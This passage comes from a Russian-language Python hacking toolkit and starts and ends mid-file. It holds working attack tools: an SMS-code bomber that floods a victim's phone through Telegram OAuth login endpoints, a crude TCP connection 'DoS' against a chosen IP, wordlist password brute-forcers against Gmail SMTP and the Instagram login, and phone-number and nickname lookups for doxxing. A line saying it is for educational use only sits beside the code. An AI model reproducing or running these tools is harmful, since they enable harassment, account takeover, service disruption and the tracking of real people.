                            "https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin",
                            {"phone": number},
                        ),
                        (
                            "https://translations.telegram.org/auth/request",
                            {"phone": number},
                        ),
                        (
                            "https://translations.telegram.org/auth/request",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch",
                            {"phone": number},
                        ),
                        (
                            "https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin",
                            {"phone": number},
                        ),
                        (
                            "https://my.telegram.org/auth/send_password",
                            {"phone": number},
                        ),
                    ]

                    for i, (url, data) in enumerate(requests_list):
                        try:
                            response = requests.post(
                                url, headers=headers, data=data, timeout=10
                            )
                            count += 1
                            self.color.progress_bar(
                                cycle * len(requests_list) + i + 1,
                                total_requests * 3,
                                prefix="Отправка запросов:",
                                suffix=f"Отправлено: {count}",
                                length=40,
                            )
                        except:
                            pass

                    print(
                        colored(
                            f"\n✅ Цикл {cycle+1} завершен. Коды успешно отправлены",
                            "cyan",
                        )
                    )
                    print(colored(f"📊 Всего циклов: {cycle+1} ", "cyan"))

            except Exception as e:
                self.color.print_error(f"Ошибка: {e}")

            self.color.print_success(f"🎉 Всего отправлено запросов: {count}")

        except KeyboardInterrupt:
            self.color.print_warning("Бомбер остановлен пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")


# ============================================================================
# IP DOS АТАКА (из ipdos.txt)
# ============================================================================


class IPDOSAttack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.COLOR_CODE = {
            "RESET": "\033[0m",
            "GREEN": "\033[32m",
            "RED": "\033[31m",
            "PURPLE": "\033[95m",
        }

    def print_colored(self, text, color):
        print(self.COLOR_CODE[color] + text + self.COLOR_CODE["RESET"])

    def get_target_ip(self):
        return input(
            self.COLOR_CODE["PURPLE"]
            + "Введите IP адрес для атаки: "
            + self.COLOR_CODE["RESET"]
        )

    def send_tcp_request(self, ip, port, request_num):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            self.print_colored(
                f"[{request_num}] [+] Socket connected successfully", "GREEN"
            )
            sock.close()
            return True
        except socket.error as e:
            self.print_colored(
                f"[{request_num}] [-] Socket connection failed: {e}", "RED"
            )
            return False

    def run(self):
        """Запуск IP DOS атаки"""
        banner = """
                                                                             
 █    ██  ███▄    █ ▓█████▄ ▓█████  ██▀███   ██▓     ██▓  █████▒▓█████ 
 ██  ▓██▒ ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒▓██▒    ▓██▒▓██   ▒ ▓█   ▀ 
▓██  ▒██░▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒▒██░    ▒██▒▒████ ░ ▒███   
▓▓█  ░██░▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  ▒██░    ░██░░▓█▒  ░ ▒▓█  ▄ 
▒▒█████▓ ▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒░██████▒░██░░▒█░    ░▒████▒
░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░▓   ▒ ░    ░░ ▒░ ░
░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░ ▒ ░ ░       ░ ░  ░
 ░░░ ░ ░    ░   ░ ░  ░ ░  ░    ░     ░░   ░   ░ ░    ▒ ░ ░ ░       ░   
   ░              ░    ░       ░  ░   ░         ░  ░ ░             ░  ░
                     ░                                                 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
                              IP Attack    

          """

        self.print_colored(banner, "PURPLE")

        try:
            ip_address = self.get_target_ip()
            if not ip_address:
                self.color.print_error("IP адрес не введен")
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            port = 80
            num_requests = 100

            self.color.print_info(f"🎯 Цель: {ip_address}:{port}")
            self.color.print_info(f"📊 Количество запросов: {num_requests}")

            successful = 0
            failed = 0

            for i in range(num_requests):
                self.color.progress_bar(
                    i + 1,
                    num_requests,
                    prefix="Атака:",
                    suffix=f"Успешно: {successful}",
                    length=40,
                )

                if self.send_tcp_request(ip_address, port, i + 1):
                    successful += 1
                else:
                    failed += 1

                time.sleep(0.5)

            print()
            self.color.print_success(f"✅ Атака завершена")
            self.color.print_info(f"📈 Статистика:")
            self.color.print_info(f"   ✅ Успешных подключений: {successful}")
            self.color.print_info(f"   ❌ Неудачных подключений: {failed}")

        except KeyboardInterrupt:
            self.color.print_warning("Атака прервана пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка при выполнении атаки: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")


# ============================================================================
# СЕРВИСЫ (из service.py)
# ============================================================================


class ServiceMenu:
    def __init__(self, color_manager):
        self.color = color_manager
        self.bannerservice = """
┌──────────────────────────────────────────────────┐
│[1] Сервис обфускации кода python                 │
│[2] Сервис пробива по огромной базе данных(с VPN) │
│[3] Сервис пробива по почте                       │                   
│[4] Сервис пробива авто                           │
│[5] Сервис поиска по даркнету                     │
│[6] Сервис проверки номера HLR запросом           │
│[7] Сервис проверки портов                        │
└──────────────────────────────────────────────────┘
"""

    def run(self):
        """Запуск меню сервисов"""
        clear_screen()
        self.color.print_header("🔧 СЕРВИСЫ И ИНСТРУМЕНТЫ", "━")

        print(self.bannerservice)

        select = input("[?] Введите номер желаемого сервиса -> ")

        services = {
            "1": ("https://freecodingtools.org/py-obfuscator", "Обфускатор Python"),
            "2": ("https://cybersec.org/search", "База данных с VPN"),
            "3": ("https://haveibeenpwned.com", "Проверка почты"),
            "4": ("https://allstate.com", "Проверка авто"),
            "5": ("https://darksearch.ai", "Поиск по даркнету"),
            "6": ("https://smsc.ru/testhlr", "Проверка номера HLR"),
            "7": ("https://hdmn.org/ru/port-scanner", "Проверка портов"),
        }

        if select in services:
            url, name = services[select]
            self.color.print_info(f"🌐 Открываю сервис: {name}")
            webbrowser.open(url)

            back = input("\n[?] Вернуться в главное меню? Yes/No -> ")
            if back.lower() == "yes":
                return
            elif back.lower() == "no":
                self.color.print_warning("[!] Хорошо, вы не вернетесь в главное меню")
                input("\n↵ Нажмите Enter для выхода...")
                exit()
        else:
            self.color.print_error("[!] Ошибка, проверьте вводимые данные")
            time.sleep(3)
            self.run()


# ============================================================================
# ВЗЛОМ ПОЧТЫ (из код_взлома_почт.txt)
# ============================================================================


class EmailHack:
    def __init__(self, color_manager):
        self.color = color_manager
        self.GMAIL_PORT = "587"

    def artwork(self):
        print("\n")
        colors = ["\033[92m", "\033[91m", "\033[0;33m"]
        RAND = random.choice(colors)

        art = (
            RAND
            + """
     ▄████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓     ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀
    ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒
   ▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░
   ░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄
   ░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
     ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
      ░   ░ ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
    ░ ░   ░ ░      ░     ░   ▒    ▒ ░  ░ ░    ░  ░░ ░  ░   ▒   ░        ░ ░░ ░
          ░        ░         ░  ░ ░      ░  ░ ░  ░  ░      ░  ░░ ░      ░  ░
                                                               ░"""
        )
        print(art)

    def run(self):
        """Запуск взлома почты"""
        self.artwork()

        try:
            user = input("Введите целевую почту Gmail: ")

            if not user:
                self.color.print_error("Почта не введена")
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            pwd = input(
                "Введите '0' для использования встроенного списка паролей\nВведите '1' чтобы добавить свой список паролей\nОпция: "
            )

            if pwd == "0":
                passswfile = "passwords.txt"
                self.color.print_info("Используется стандартный список паролей")
            elif pwd == "1":
                passswfile = input("Введите путь к файлу с паролями: ")
                if not os.path.exists(passswfile):
                    self.color.print_error(f"Файл {passswfile} не найден")
                    return
            else:
                self.color.print_error("Неверный ввод! Завершение...")
                return

            try:
                with open(passswfile, "r") as f:
                    passwords = f.readlines()
                    self.color.print_info(f"📁 Загружено паролей: {len(passwords)}")

                    found = False
                    for i, password in enumerate(passwords):
                        password = password.strip()
                        try:
                            smtp = smtplib.SMTP("smtp.gmail.com", self.GMAIL_PORT)
                            smtp.ehlo()
                            smtp.starttls()
                            smtp.login(user, password)
                            self.color.print_success(f"[+] Пароль найден: {password}")
                            found = True
                            smtp.quit()
                            break
                        except smtplib.SMTPAuthenticationError:
                            self.color.progress_bar(
                                i + 1,
                                len(passwords),
                                prefix="Подбор пароля:",
                                suffix=f"Проверено: {i+1}/{len(passwords)}",
                                length=40,
                            )
                            if hasattr(smtp, "quit"):
                                try:
                                    smtp.quit()
                                except:
                                    pass
                        except Exception as e:
                            self.color.print_error(f"Ошибка: {e}")
                            if hasattr(smtp, "quit"):
                                try:
                                    smtp.quit()
                                except:
                                    pass
                            break

                    if not found:
                        self.color.print_error("[-] Пароль не найден в списке")

            except FileNotFoundError:
                self.color.print_error(f"Файл {passswfile} не найден")
            except Exception as e:
                self.color.print_error(f"Ошибка: {e}")

        except KeyboardInterrupt:
            self.color.print_warning("Взлом прерван пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка при подключении к SMTP: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")


# ============================================================================
# ВЗЛОМ ИНСТАГРАММА (из взлом_инстаграмма.txt)
# ============================================================================


class InstagramHack:
    def __init__(self, color_manager):
        self.color = color_manager

    def userExists(self, username):
        """Проверка существования пользователя"""
        try:
            r = requests.get(f"https://www.instagram.com/{username}/?__a=1", timeout=10)
            if r.status_code == 404:
                self.color.print_error("Пользователь не найден")
                return False
            elif r.status_code == 200:
                try:
                    followdata = json.loads(r.text)
                    fUserID = followdata["user"]["id"]
                    return {"username": username, "id": fUserID}
                except:
                    return {"username": username, "id": "unknown"}
        except:
            return False

    def Login(self, username, password):
        """Авторизация в Instagram"""
        sess = requests.Session()
        sess.cookies.update(
            {
                "sessionid": "",
                "mid": "",
                "ig_pr": "1",
                "ig_vw": "1920",
                "csrftoken": "",
                "s_network": "",
                "ds_user_id": "",
            }
        )
        sess.headers.update(
            {
                "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "x-instagram-ajax": "1",
                "X-Requested-With": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "ContentType": "application/x-www-form-urlencoded",
                "Connection": "keep-alive",
                "Accept": "*/*",
                "Referer": "https://www.instagram.com",
                "authority": "www.instagram.com",
                "Host": "www.instagram.com",
                "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4",
                "Accept-Encoding": "gzip, deflate",
            }
        )

        try:
            r = sess.get("https://www.instagram.com/")
            sess.headers.update(
                {"X-CSRFToken": r.cookies.get_dict().get("csrftoken", "")}
            )

            data = {"username": username, "password": password}
            r = sess.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=data,
                allow_redirects=True,
            )

            if r.status_code == 200:
                try:
                    data = json.loads(r.text)
                    if data.get("authenticated", False):
                        return sess
                    else:
                        self.color.print_error(f"Неверный пароль: {password}")
                        return False
                except:
                    return False
            return False
        except:
            return False

    def run(self):
        """Запуск взлома Instagram"""
        self.color.print_header("📸 ВЗЛОМ INSTAGRAM", "━")

        try:
            filename = "pass.txt"
            if not os.path.exists(filename):
                self.color.print_error(
                    f"Файл {filename} не найден. Создайте файл со списком паролей."
                )
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            with open(filename, "r", encoding="utf-8") as f:
                passwords = f.read().splitlines()
                self.color.print_info(f"✅ Загружено паролей: {len(passwords)}")

            username = input("Введите имя пользователя Instagram: ").strip()
            if not username:
                self.color.print_error("Имя пользователя не введено")
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            user_info = self.userExists(username)
            if not user_info:
                input(f"\n↵ Нажмите Enter для возврата в меню...")
                return

            delay = input("Задержка между попытками (в секундах, по умолчанию 1): ")
            try:
                delayLoop = int(delay) if delay.strip() else 1
            except:
                delayLoop = 1

            self.color.print_info(f"🔍 Начинаю подбор пароля для {username}")

            found = False
            for i, password in enumerate(passwords):
                try:
                    self.color.progress_bar(
                        i + 1,
                        len(passwords),
                        prefix="Подбор пароля:",
                        suffix=f"Проверено: {i+1}/{len(passwords)}",
                        length=40,
                    )

                    sess = self.Login(username, password.strip())
                    if sess:
                        self.color.print_success(
                            f"✅ Успешный вход! {username}:{password}"
                        )
                        found = True
                        break

                    time.sleep(delayLoop)

                except KeyboardInterrupt:
                    self.color.print_warning("Подбор прерван пользователем")
                    an = input("Выйти? (y/n): ")
                    if an.lower() == "y":
                        break
                    else:
                        continue
                except:
                    continue

            if not found:
                self.color.print_error("❌ Пароль не найден в списке")

        except KeyboardInterrupt:
            self.color.print_warning("Взлом прерван пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")


# ============================================================================
# ОСНОВНЫЕ ФУНКЦИИ ИЗ ВАШЕГО КОДА
# ============================================================================


class PhoneNumberProbe:
    def __init__(self, color_manager):
        self.color = color_manager
        self.check_number_link = "https://htmlweb.ru/geo/api.php?json&telcod="
        self.not_found_text = "Информация отсутствует"
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"
            }
        )

    def get_number_data(self, user_number):
        """Получение данных по номеру телефона"""
        try:
            response = self.session.get(
                self.check_number_link + user_number, timeout=10
            )
            if response.ok:
                return response.json()
            else:
                return {"status_error": True}
        except requests.exceptions.ConnectionError:
            return {"status_error": True}
        except Exception as e:
            return {"status_error": True, "error": str(e)}

    def format_number(self, number):
        """Форматирование номера телефона"""
        clean = re.sub(r"[^\d+]", "", number)
        if clean.startswith("8") and len(clean) == 11:
            clean = "+7" + clean[1:]
        elif clean.startswith("7") and len(clean) == 11:
            clean = "+" + clean
        elif not clean.startswith("+"):
            clean = "+" + clean
        return clean

    def generate_search_links(self, phone):
        """Генерация ссылок для поиска по номеру"""
        clean_phone = phone.replace("+", "")

        links = [
            ("Instagram", f"https://www.instagram.com/accounts/password/reset"),
            ("WhatsApp", f"https://api.whatsapp.com/send?phone={phone}&text=Привет"),
            ("Facebook", f"https://facebook.com/login/identify"),
            (
                "LinkedIn",
                f"https://www.linkedin.com/checkpoint/rp/request-password-reset",
            ),
            ("Одноклассники", f"https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink"),
            ("Twitter/X", f"https://twitter.com/account/begin_password_reset"),
            ("Viber", f"https://viber://add?number={clean_phone}"),
            ("Skype", f"skype:{clean_phone}?call"),
            ("Telegram", f"https://t.me/{clean_phone}"),
            ("Звонок", f"tel:{phone}"),
            ("VK", f"https://vk.com/phone/{clean_phone}"),
            ("Google", f"https://www.google.com/search?q={phone}"),
            ("Yandex", f"https://yandex.ru/search/?text={phone}"),
        ]

        return links

    def run(self):
        """Запуск пробива номера телефона"""
        self.color.print_header("🔍 ПРОБИВ НОМЕРА ТЕЛЕФОНА", "━")

        try:
            user_number = input(
                "📞 Введите номер телефона (например, +79833170773): "
            ).strip()

            if not user_number:
                self.color.print_error("Номер телефона не введен")
                input("\n↵ Нажмите Enter для продолжения...")
                return

            formatted_number = self.format_number(user_number)

            self.color.print_info(f"🔍 Поиск данных для: {formatted_number}")

            for i in range(100):
                self.color.progress_bar(
                    i + 1, 100, prefix="Поиск данных:", suffix="Завершено", length=40
                )
                time.sleep(0.02)

            print()

            number_data = self.get_number_data(formatted_number.replace("+", ""))

            if number_data.get("limit", 1) <= 0:
                self.color.print_warning("⚠️  Лимиты запросов исчерпаны")
                self.color.print_info(
                    f"Всего лимитов: {number_data.get('limit', self.not_found_text)}"
                )

            elif number_data.get("status_error") or number_data.get("error"):
                self.color.print_error("❌ Данные не найдены")
                self.color.print_info(
                    "Проверьте правильность номера или попробуйте позже"
                )

            else:
                country = number_data.get("country", {})
                capital = number_data.get("capital", {})
                region = number_data.get(
                    "region",
                    {
                        "autocod": self.not_found_text,
                        "name": self.not_found_text,
                        "okrug": self.not_found_text,
                    },
                )
                other = number_data.get("0", {})

                self.color.print_header("📊 ИНФОРМАЦИЯ О НОМЕРЕ", "─")

                info_items = []

                if country.get("country_code3") == "UKR":
                    info_items.append(("🌍 Страна", "Украина"))
                else:
                    info_items.append(
                        (
                            "🌍 Страна",
                            f"{country.get('name', self.not_found_text)}, {country.get('fullname', self.not_found_text)}",
                        )
                    )

                info_items.append(("🏙️ Город", other.get("name", self.not_found_text)))
                info_items.append(
                    ("📮 Почтовый индекс", str(other.get("post", self.not_found_text)))
                )
                info_items.append(
                    ("💰 Код валюты", str(country.get("iso", self.not_found_text)))
                )
                info_items.append(
                    (
                        "📞 Телефонные коды",
                        str(capital.get("telcod", self.not_found_text)),
                    )
                )
                info_items.append(
                    (
                        "🚗 Гос. номер региона",
                        str(region.get("autocod", self.not_found_text)),
                    )
                )

                oper_info = []
                if other.get("oper"):
                    oper_info.append(other.get("oper"))
                if other.get("oper_brand"):
                    oper_info.append(other.get("oper_brand"))
                if other.get("def"):
                    oper_info.append(other.get("def"))

                info_items.append(
                    (
                        "📡 Оператор",
                        ", ".join(oper_info) if oper_info else self.not_found_text,
                    )
                )

                location_parts = []
                if country.get("name"):
                    location_parts.append(country.get("name"))
                if region.get("name"):
                    location_parts.append(region.get("name"))
                if other.get("name"):
                    location_parts.append(other.get("name"))

                info_items.append(
                    (
                        "📍 Местоположение",
                        (
                            ", ".join(location_parts)
                            if location_parts
                            else self.not_found_text
                        ),
                    )
                )
                info_items.append(
                    ("🗺️ Координаты", number_data.get("location", self.not_found_text))
                )

                lang_info = []
                if country.get("lang"):
                    lang_info.append(country.get("lang").title())
                if country.get("langcod"):
                    lang_info.append(country.get("langcod"))

                info_items.append(
                    (
                        "🗣️ Язык",
                        ", ".join(lang_info) if lang_info else self.not_found_text,
                    )
                )
                info_items.append(
                    (
                        "🏞️ Регион",
                        f"{region.get('name', self.not_found_text)}, {region.get('okrug', self.not_found_text)}",
                    )
                )
                info_items.append(
                    ("🏛️ Столица", capital.get("name", self.not_found_text))
                )

                lat = other.get("latitude", self.not_found_text)
                lon = other.get("longitude", self.not_found_text)
                if lat != self.not_found_text and lon != self.not_found_text:
                    info_items.append(("🌐 Координаты", f"{lat}, {lon}"))

                for label, value in info_items:
                    print(f"• {label}: {value}")

                self.color.print_header("📈 СТАТИСТИКА", "─")
                print(
                    f"• Оставшиеся лимиты: {number_data.get('limit', self.not_found_text)}"
                )

                self.color.print_header("🔗 ССЫЛКИ ДЛЯ ПОИСКА", "─")
                search_links = self.generate_search_links(formatted_number)

                for i, (platform, url) in enumerate(search_links, 1):
                    print(f"{i:2}. {platform:15}: {url}")

                save = input(f"\n💾 Сохранить результаты? (y/n): ").lower()
                if save == "y":
                    self.save_results(formatted_number, number_data, search_links)

        except KeyboardInterrupt:
            self.color.print_warning("Поиск прерван пользователем")
        except Exception as e:
            self.color.print_error(f"Ошибка при поиске: {e}")

        input(f"\n↵ Нажмите Enter для возврата в меню...")

    def save_results(self, phone, data, links):
        """Сохранение результатов поиска"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"phone_probe_{phone}_{timestamp}.txt"

        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write("ОТЧЕТ ПРОБИВА НОМЕРА ТЕЛЕФОНА\n")
                f.write("=" * 80 + "\n\n")

                f.write(f"Номер телефона: {phone}\n")
                f.write(
                    f"Дата поиска: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                )

                country = data.get("country", {})
                other = data.get("0", {})
                region = data.get("region", {})
                capital = data.get("capital", {})

                f.write("ОСНОВНАЯ ИНФОРМАЦИЯ:\n")
                f.write("-" * 80 + "\n")

                if country.get("country_code3") == "UKR":
                    f.write(f"Страна: Украина\n")
                else:
                    f.write(
                        f"Страна: {country.get('name', 'Н/Д')}, {country.get('fullname', 'Н/Д')}\n"
                    )

                f.write(f"Город: {other.get('name', 'Н/Д')}\n")
                f.write(f"Почтовый индекс: {other.get('post', 'Н/Д')}\n")
                f.write(
                    f"Оператор: {other.get('oper', 'Н/Д')}, {other.get('oper_brand', 'Н/Д')}\n"
                )
                f.write(
                    f"Регион: {region.get('name', 'Н/Д')}, {region.get('okrug', 'Н/Д')}\n"
                )
                f.write(
                    f"Координаты: {other.get('latitude', 'Н/Д')}, {other.get('longitude', 'Н/Д')}\n\n"
                )

                f.write("ССЫЛКИ ДЛЯ ПОИСКА:\n")
                f.write("-" * 80 + "\n")
                for platform, url in links:
                    f.write(f"{platform}: {url}\n")

                f.write(f"\n" + "=" * 80 + "\n")
                f.write("Отчет создан с помощью DRESSEN Security Toolkit\n")
                f.write("Только для образовательных целей\n")

            self.color.print_success(f"✅ Отчет сохранен: {filename}")

        except Exception as e:
            self.color.print_error(f"❌ Ошибка при сохранении отчета: {e}")


# ============================================================================
# ДОПОЛНИТЕЛЬНЫЕ КЛАССЫ ИЗ ВАШЕГО КОДА
# ============================================================================


class NicknameSearch:
    def __init__(self, color_manager):
        self.color = color_manager
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
        )

    def format_nickname(self, nick):
        """Форматирование никнейма для разных платформ"""
        return {
            "original": nick,
            "no_spaces": nick.replace(" ", ""),
            "underscore": nick.replace(" ", "_"),
            "dash": nick.replace(" ", "-"),
            "lower": nick.lower().replace(" ", ""),
            "no_special": re.sub(r"[^a-zA-Z0-9]", "", nick),
        }

    def check_url(self, url, platform_name):
        """Проверка URL на существование аккаунта"""
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)

            if response.status_code == 200:
                text = response.text.lower()

                not_found_phrases = [
                    "страница не найдена",
                    "not found",
                    "doesn't exist",
                    "не существует",
                    "404",
                    "error 404",
                    "page not found",
                    "account not found",
                    "пользователь не найден",
                    "user not found",
                ]

                for phrase in not_found_phrases:
                    if phrase in text:
                        return False, response.status_code

                return True, response.status_code

            elif response.status_code == 404:
                return False, 404
            elif response.status_code == 403:
                return None, 403
            elif response.status_code == 429:
                return None, 429
            else:
                return None, response.status_code

        except requests.exceptions.Timeout:
            return None, "timeout"
        except requests.exceptions.ConnectionError:
            return None, "connection error"
        except Exception as e:
            return None, f"error: {str(e)}"

    def get_platforms(self):
        """Список платформ для поиска"""
        return [
            {
                "name": "Instagram",
                "url_template": "https://www.instagram.com/{nick}/",
                "emoji": "📸",
                "notes": "Публичный профиль",
            },
            {
                "name": "TikTok",
                "url_template": "https://www.tiktok.com/@{nick}",
                "emoji": "🎵",
                "notes": "Публичный аккаунт",
            },
            {
                "name": "Twitter/X",
                "url_template": "https://twitter.com/{nick}",
                "emoji": "🐦",
                "notes": "Публичный профиль",
            },
            {
                "name": "Facebook",
                "url_template": "https://www.facebook.com/{nick}",
                "emoji": "👤",
                "notes": "Публичный профиль",
            },
            {
                "name": "YouTube",
                "url_template": "https://www.youtube.com/@{nick}",
                "emoji": "🎬",
                "notes": "Канал",
            },
            {
                "name": "Telegram",
                "url_template": "https://t.me/{nick}",
                "emoji": "📱",
                "notes": "Публичный username",
            },
            {
                "name": "GitHub",
                "url_template": "https://github.com/{nick}",
                "emoji": "💻",
                "notes": "Публичный профиль",
            },
            {
                "name": "Reddit",
                "url_template": "https://www.reddit.com/user/{nick}",
                "emoji": "👽",
                "notes": "Профиль",
            },
            {
                "name": "Steam",
                "url_template": "https://steamcommunity.com/id/{nick}",
                "emoji": "🎮",
                "notes": "Профиль сообщества",
            },
            {
                "name": "Twitch",
                "url_template": "https://www.twitch.tv/{nick}",
                "emoji": "🟣",
                "notes": "Канал",
            },
            {
                "name": "VK",
                "url_template": "https://vk.com/{nick}",
                "emoji": "📘",
                "notes": "Профиль",
            },
            {
                "name": "Pinterest",
                "url_template": "https://pinterest.com/{nick}",
                "emoji": "📌",
                "notes": "Профиль",
            },
            {
                "name": "LinkedIn",
                "url_template": "https://linkedin.com/in/{nick}",
                "emoji": "💼",
                "notes": "Профессиональный профиль",
            },
            {
                "name": "Spotify",
                "url_template": "https://open.spotify.com/user/{nick}",
                "emoji": "🎵",
                "notes": "Профиль пользователя",
            },
        ]

    def search_nickname(self, nickname):
        """Поиск никнейма по всем платформам"""
        formatted = self.format_nickname(nickname)
        platforms = self.get_platforms()
        results = []

        self.color.print_header(f"🔍 ПОИСК НИКНЕЙМА: {nickname}", "━")
        self.color.print_info(f"Начинаю поиск по {len(platforms)} платформам...\n")

        for i, platform in enumerate(platforms):
            if "github" in platform["name"].lower():
                nick_to_use = formatted["no_special"]
            elif (
                "twitter" in platform["name"].lower() or "x" in platform["name"].lower()
            ):
                nick_to_use = formatted["no_spaces"].lower()
            elif "instagram" in platform["name"].lower():
                nick_to_use = formatted["no_spaces"].lower()
            elif "tiktok" in platform["name"].lower():
                nick_to_use = formatted["no_spaces"].lower()
            else:
                nick_to_use = formatted["no_spaces"]

            url = platform["url_template"].format(nick=nick_to_use)

            self.color.progress_bar(
                i + 1,
                len(platforms),
                prefix=f'Проверка {platform["name"]}:',
                suffix="",
                length=40,
                color_pair=self.color.gradient_colors[
                    i % len(self.color.gradient_colors)
                ],
            )

            exists, status = self.check_url(url, platform["name"])

            result = {
                "platform": platform["name"],
                "emoji": platform["emoji"],
                "url": url,
                "exists": exists,
                "status": status,
                "notes": platform["notes"],
            }
            results.append(result)

            time.sleep(0.5)

        print("\n")
        return results

    def display_results(self, results, nickname):
        """Отображение результатов поиска"""
        self.color.print_header("📊 РЕЗУЛЬТАТЫ ПОИСКА", "━")

        found = [r for r in results if r["exists"] is True]
        not_found = [r for r in results if r["exists"] is False]
        errors = [r for r in results if r["exists"] is None]

        print(f"🎯 Цель поиска: {nickname}")
